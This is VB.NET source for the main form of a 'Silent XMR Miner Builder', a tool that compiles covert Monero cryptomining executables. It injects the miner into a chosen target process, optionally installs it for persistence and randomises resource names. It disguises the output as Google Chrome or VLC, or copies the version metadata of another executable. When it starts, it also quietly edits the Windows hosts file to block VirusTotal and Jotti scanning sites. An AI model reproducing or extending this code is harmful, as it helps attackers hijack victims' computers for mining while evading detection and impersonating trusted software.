Public Class Form1
    Public Shared rand As New Random()

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        CheckForIllegalCrossThreadCalls = False
        Codedom.F = Me

        BackgroundWorker1.RunWorkerAsync()
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Try
            MephForm1.Text = "Silent XMR Miner Builder"
        Catch ex As Exception
        End Try

        Try
            txtInstallPathMain.SelectedIndex = 0
            txtInjection.SelectedIndex = 0
        Catch ex As Exception
        End Try

        Try
            Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\System32\drivers\etc\hosts"
            If IO.File.Exists(path) AndAlso Not IO.File.ReadAllText(path).Contains("virustotal") Then

                Dim appendText As String = "127.0.0.1    https://www.virustotal.com" + Environment.NewLine + "127.0.0.1    http://www.virustotal.com" + Environment.NewLine + "127.0.0.1    www.virustotal.com" +
                   Environment.NewLine + "127.0.0.1    https://virusscan.jotti.org" + Environment.NewLine + "127.0.0.1    virusscan.jotti.org" + Environment.NewLine + "127.0.0.1    www.virusscan.jotti.org"

                IO.File.AppendAllText(path, appendText)
            End If
        Catch ex As Exception
        End Try
    End Sub

    Public OutputPayload
    Public Resources_dll = Randomi(rand.Next(5, 10))
    Public Resources_cpu = Randomi(rand.Next(5, 10))
    Public Resources_nvidia = Randomi(rand.Next(5, 10))
    Public Resources_amd = Randomi(rand.Next(5, 10))
    Public Resources_Parent = Randomi(rand.Next(5, 10))
    Public AESKEY As String = Randomi(rand.Next(5, 10))

    Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
        Try
            If txtPoolUsername.Text <> "" AndAlso txtPoolURL.Text <> "" Then
                Dim s As New SaveFileDialog
                s.Filter = "Executable |*.exe"
                s.InitialDirectory = Application.StartupPath
                If s.ShowDialog = DialogResult.OK Then
                    OutputPayload = s.FileName
                    BackgroundWorker2.RunWorkerAsync()
                    btnBuild.Enabled = False
                    btnBuild.Text = "Please wait..."
                End If
            Else
                MsgBox("Please enter valid pool settings.", MsgBoxStyle.Exclamation)
                MephTabcontrol2.SelectedIndex = 0
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub BackgroundWorker2_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork

        Try
            If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.ResetText()) : Else : txtLog.ResetText() : End If
            Dim InjectionTarget = txtInjection.Text.Split(" ")
            Dim Source = My.Resources.Program
            txtLog.Text = txtLog.Text.Insert(0, "Starting..." + vbNewLine)
            Source = Replace(Source, "#dll", Resources_dll)
            Source = Replace(Source, "#cpu", Resources_cpu)
            Source = Replace(Source, "#nvidia", Resources_nvidia)
            Source = Replace(Source, "#amd", Resources_amd)
            Source = Replace(Source, "#ParentRes", Resources_Parent)
            Source = Replace(Source, "#USER", txtPoolUsername.Text)
            Source = Replace(Source, "#URL", txtPoolURL.Text)
            Source = Replace(Source, "#PWD", txtPoolPassowrd.Text)
            Source = Replace(Source, "#KEY", AESKEY)
            Source = Replace(Source, "#MaxCPU", txtMaxCPU.Text.Replace("%", ""))
            Source = Replace(Source, "#InjectionTarget", InjectionTarget(0))
            Source = Replace(Source, "#InjectionDir", InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", Environment.GetFolderPath(Environment.SpecialFolder.Windows)))


            txtLog.Text = txtLog.Text.Insert(0, "Adding injection " + txtInjection.Text + vbNewLine)

            If chkInstall.Checked = True Then
                Source = Replace(Source, "#Const INS = False", "#Const INS = True")
                Source = Replace(Source, "PayloadPath", "Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
            End If


            If chkAssembly.Checked = True Then
                txtLog.Text = txtLog.Text.Insert(0, "Writing Assembly Information..." + vbNewLine)
                Source = Replace(Source, "#Const Assembly = False", "#Const Assembly = True")

                Source = Replace(Source, "%Title%", txtTitle.Text)
                Source = Replace(Source, "%Description%", txtDescription.Text)
                Source = Replace(Source, "%Company%", txtCompany.Text)
                Source = Replace(Source, "%Product%", txtProduct.Text)
                Source = Replace(Source, "%Copyright%", txtCopyright.Text)
                Source = Replace(Source, "%Trademark%", txtTrademark.Text)
                Source = Replace(Source, "%v1%", num_Assembly1.Text)
                Source = Replace(Source, "%v2%", num_Assembly2.Text)
                Source = Replace(Source, "%v3%", num_Assembly3.Text)
                Source = Replace(Source, "%v4%", num_Assembly4.Text)
                Source = Replace(Source, "%Guid%", Guid.NewGuid.ToString)

            End If

            If chkIcon.Checked And txtIconPath.Text IsNot "" Then
                Codedom.Compiler(OutputPayload, Source, Resources_Parent, txtIconPath.Text)
            Else
                Codedom.Compiler(OutputPayload, Source, Resources_Parent, Nothing)
            End If

            If Codedom.OK = True Then

                txtLog.Text = txtLog.Text.Insert(0, "Done!..." + vbNewLine)
                If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                btnBuild.Enabled = True

                Try
                    IO.File.Delete(IO.Path.GetTempPath + "\" + Resources_Parent + ".Resources")
                Catch ex As Exception
                End Try

            Else
                txtLog.Text = txtLog.Text.Insert(0, "Error!..." + vbNewLine)
                If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                btnBuild.Enabled = True
            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
            If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
            btnBuild.Enabled = True
            Return
        End Try

    End Sub

    Public Shared Function Randomi(ByVal lenght As Integer) As String
        Dim Chr As String = "asdfghjklqwertyuiopmnbvcxz"
        Dim sb As New Text.StringBuilder()
        For i As Integer = 1 To lenght
            Dim idx As Integer = rand.Next(0, Chr.Length)
            sb.Append(Chr.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function

    Private Sub chkInstall_CheckedChanged(sender As Object) Handles chkInstall.CheckedChanged
        If chkInstall.Checked = True Then
            chkInstall.Text = "Enabled"
            txtInstallPathMain.Enabled = True
            txtInstallFileName.Enabled = True
        Else
            chkInstall.Text = "Disabled"
            txtInstallPathMain.Enabled = False
            txtInstallFileName.Enabled = False
        End If
    End Sub

    Private Sub chkAssembly_CheckedChanged(sender As Object) Handles chkAssembly.CheckedChanged
        If chkAssembly.Checked = True Then
            chkAssembly.Text = "Enabled"
            txtTitle.Enabled = True
            txtDescription.Enabled = True
            txtProduct.Enabled = True
            txtCompany.Enabled = True
            txtCopyright.Enabled = True
            txtTrademark.Enabled = True
            num_Assembly1.Enabled = True
            num_Assembly2.Enabled = True
            num_Assembly3.Enabled = True
            num_Assembly4.Enabled = True
            btn_assemblyRandom.Enabled = True
            btn_assemblyClone.Enabled = True
        Else
            chkAssembly.Text = "Disabled"
            txtTitle.Enabled = False
            txtDescription.Enabled = False
            txtProduct.Enabled = False
            txtCompany.Enabled = False
            txtCopyright.Enabled = False
            txtTrademark.Enabled = False
            num_Assembly1.Enabled = False
            num_Assembly2.Enabled = False
            num_Assembly3.Enabled = False
            num_Assembly4.Enabled = False
            btn_assemblyRandom.Enabled = False
            btn_assemblyClone.Enabled = False
        End If
    End Sub

    Private Sub btn_assemblyRandom_Click(sender As Object, e As EventArgs) Handles btn_assemblyRandom.Click
        Try
            Select Case rand.Next(4)
                Case 0
                    txtTitle.Text = "chrome.exe"
                    txtDescription.Text = "Google Chrome"
                    txtProduct.Text = "Google Chrome"
                    txtCompany.Text = "Google Inc."
                    txtCopyright.Text = "Copyright 2017 Google Inc. All rights reserved."
                    txtTrademark.Text = ""
                    num_Assembly1.Text = "70"
                    num_Assembly2.Text = "0"
                    num_Assembly3.Text = "3538"
                    num_Assembly4.Text = "110"

                Case 1
                    txtTitle.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtDescription.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtProduct.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtCompany.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtCopyright.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtTrademark.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    num_Assembly1.Text = rand.Next(0, 10)
                    num_Assembly2.Text = rand.Next(0, 10)
                    num_Assembly3.Text = rand.Next(0, 10)
                    num_Assembly4.Text = rand.Next(0, 10)

                Case 2
                    txtTitle.Text = "vlc"
                    txtDescription.Text = "VLC media player"
                    txtProduct.Text = "VLC media player"
                    txtCompany.Text = "VideoLAN"
                    txtCopyright.Text = "Copyright © 1996-2018 VideoLAN and VLC Authors"
                    txtTrademark.Text = "VLC media player, VideoLAN and x264 are registered trademarks from VideoLAN"
                    num_Assembly1.Text = "3"
                    num_Assembly2.Text = "0"
                    num_Assembly3.Text = "3"
                    num_Assembly4.Text = "0"

                Case 3
                    txtTitle.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtDescription.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtProduct.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtCompany.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtCopyright.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtTrademark.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    num_Assembly1.Text = rand.Next(0, 10)
                    num_Assembly2.Text = rand.Next(0, 10)
                    num_Assembly3.Text = rand.Next(0, 10)
                    num_Assembly4.Text = rand.Next(0, 10)

            End Select
        Catch : End Try
    End Sub

    Private Sub btn_assemblyClone_Click(sender As Object, e As EventArgs) Handles btn_assemblyClone.Click
        Dim o As New OpenFileDialog
        o.Filter = "Executable |*.exe"
        If o.ShowDialog = DialogResult.OK Then
            Dim info As FileVersionInfo = FileVersionInfo.GetVersionInfo(o.FileName)

            Try
                txtTitle.Text = info.InternalName
                txtDescription.Text = info.FileDescription
                txtProduct.Text = info.CompanyName
                txtCompany.Text = info.ProductName
                txtCopyright.Text = info.LegalCopyright
                txtTrademark.Text = info.LegalTrademarks
            Catch ex As Exception
            End Try



            Dim version As String()
            If info.FileVersion.Contains(",") Then
                version = info.FileVersion.Split(","c)
            Else
                version = info.FileVersion.Split("."c)
            End If

            Try
                num_Assembly1.Text = version(0)
                num_Assembly2.Text = version(1)
                num_Assembly3.Text = version(2)
                num_Assembly4.Text = version(3)
            Catch ex2 As Exception
            End Try
        End If
    End Sub

    Private Sub chkIcon_CheckedChanged(sender As Object) Handles chkIcon.CheckedChanged
        If chkIcon.Checked = True Then
            chkIcon.Text = "Enabled"
            btnBrowseIcon.Enabled = True
        Else
            chkIcon.Text = "Disabled"
            btnBrowseIcon.Enabled = False
        End If
    End Sub

    Private Sub btnBrowseIcon_Click(sender As Object, e As EventArgs) Handles btnBrowseIcon.Click
        Try
            Dim o As New OpenFileDialog
            o.Filter = "Icon |*.ico"
            If o.ShowDialog = DialogResult.OK Then
                txtIconPath.Text = o.FileName
                picIcon.ImageLocation = o.FileName
            Else
                txtIconPath.Text = ""
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub MephTabControl2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles MephTabcontrol2.SelectedIndexChanged
        On Error Resume Next
        If Me.MephTabcontrol2.SelectedIndex = 0 Then
        End If
    End Sub
End Class
